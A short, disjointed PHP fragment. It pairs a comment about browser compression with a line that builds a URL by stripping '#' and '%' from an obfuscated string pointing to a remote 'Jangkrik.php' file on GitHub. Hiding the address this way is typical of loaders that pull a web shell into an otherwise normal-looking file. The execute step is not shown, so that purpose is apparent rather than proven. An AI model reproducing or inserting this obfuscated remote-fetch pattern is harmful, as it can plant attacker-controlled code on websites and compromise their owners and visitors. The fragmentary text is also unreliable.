...
| Even if itdoes, however, not all browsers support compression
...
$url = str_replace(['#', '%'], '', 'ht%tps://raw.githubusercontent.com/ara123123a/ayambakar/refs/heads/main/Jangkrik.php');
